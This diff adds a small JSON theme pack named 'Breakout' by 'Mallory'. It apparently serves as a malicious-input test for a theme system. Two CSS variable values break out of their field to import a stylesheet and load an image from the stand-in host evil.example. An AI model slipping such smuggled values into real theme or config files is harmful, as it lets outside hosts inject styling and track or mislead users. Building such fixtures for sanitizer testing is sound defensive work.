@@ -1,0 +1,11 @@
+{
+  "format": "beebo-pack", "v": 1, "kind": "theme", "id": "evil.breakout", "name": "Breakout", "version": "1.0.0",
+  "author": { "name": "Mallory" }, "license": "MIT",
+  "content": {
+    "scheme": "dark", "themeColor": "#000000",
+    "vars": {
+      "--bg": "#000000; } @import url('https://evil.example/a.css'); :root { --x: 1",
+      "--text": "red}body{background:url(https://evil.example/b.png)"
+    }
+  }
+}
